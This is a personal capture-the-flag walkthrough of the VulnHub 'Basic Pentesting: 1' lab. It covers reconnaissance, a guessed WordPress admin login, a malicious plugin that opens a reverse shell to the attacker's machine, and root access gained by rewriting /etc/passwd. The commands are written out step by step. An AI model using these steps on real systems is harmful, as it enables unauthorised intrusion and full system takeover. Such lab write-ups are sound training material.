Personal Notes on Completion of "Basic Pentesting: 1" from https://www.vulnhub.com/entry/basic-pentesting-1,216/
Taking Guidance from https://www.youtube.com/watch?v=82S8wFSypB4

To connect the Target VM and the Kali VM, I had to create a VirtualBox DHCP Server: 
C:\Program Files\Oracle\VirtualBox>VBoxManage dhcpserver add --netname intnet --ip 192.168.0.1 --netmask 255.255.255.0 --lowerip 192.168.0.2 -upperip 192.168.0.240 --enable
And set each network adapter to Internal Network > intnet (defined in command above)

Find the target IP from the login page by clicking on the network icon. Then from there, show the network settings, and an IP is listed. In this case, 192.168.0.3.

Important network topography: Kali: 192.168.0.2; Target: 192.168.0.3

Ping scan from Kali at the Target returns successful pings.

Nmap command: $nmap -sS 192.168.0.3 returns three open ports (21/tcp - ftp; 22/tcp - ssh, 80/tcp - http)

Opening a firefox window to 192.168.0.3 reveals a working web server. Nothing useful on the surface. Inspecting element confirms that there is nothing hidden... (right click > Inspect Elements)

Upon recommendation of the video, using $dirbuster to find any hidden places on the site... Dirbuster uses a sweet gui, so entering 192.168.0.3 into Target URL, and selecting /usr/share/dirbuster/wordlists/directory-wordlist-lowercase-2.3-small.txt as wordlist. Dirbuster finds alot of subdirectories to http://192.168.0.3/secret/. 

Append /secret/ to the firefox window earlier (now http://192.168.0.3/secret/). This reveals a "blog" webpage that looks quite improperly formatted.

Scrolling over one of the links shows the byperlink (bottom left) that reads /vtcsec/secret/... thus 192.168.0.3 must be aliased to vtcsec or vtcsec.com.

$vim /etc/hosts and adding lines "192.168.0.3<tab>vtcsec" and "192.168.0.3<tab>vtcsec.com" and refreshing the webpage shows a better image!

The site is a wordpress site. Under "Meta" header, there features a "Log In" button. Once clicked, this leads to a login page, where U:admin P:password is tried. This fails, but the error message informs us that "admin" is a valid username. (P|U):admin tried and works.

Once on the WordPress admin page, the video guided me to messing with the plugins:
-Cloned https://github.com/wetw0rk/malicious-wordpress-plugin and ran $python wordpwn.py 192.168.0.2 4444 Y
-Uploaded the .zip created to the WordPress server and installed it. 
-Navigated to Plugins>Editor, selected GotEm Plugon (the one we installed) and selected the wetw0rk_maybe.php file.
-Copied the directory of that file (from the top of the page where it says "Editing malicious/wetw0rk_maybe.php"). 
-Opened up a new tab and typed in vtcsec/secret/wp-content/plugins/malicious/wetw0rk_maybe.php and hit return. 
-The terminal from which $python wordpwn.py 192.168.0.2 4444 Y should open up a metasploit prompt.

From the video, I knew that the privesc vuln we will be exploiting is changing the root password in the /etc/passwd file. Had I not known this (and had the script found all its dependencies, which it didn't) I could have used https://github.com/pentestmonkey/unix-privesc-check
-"metasploit>" denotes the metasploit prompt.
-metasploit>cd /etc/
-metasploit>download passwd /home/lread/
-[in a new kali terminal window] $openssl passwd -1, and enter "pass" (I know, a fine choice ;) at the prompt.
-copy the resulting gibberish over the "x" in the first line of passwd in such a way:
---root:x:0:0..... --> root:xjk4(g;3;gPAs{;f:0:0.....
-metasploit>upload /home/lread/passwd
-metasploit>shell
-<shell>python -c 'import pty; pty.spawn("/bin/bash")' {to get to a bash prompt}
-www-data@vtcsec:/$ su root {and enter "pass", defined earlier}
-[just to flex] www-data@vtcsec:/$whoami
"root"

Lyell Read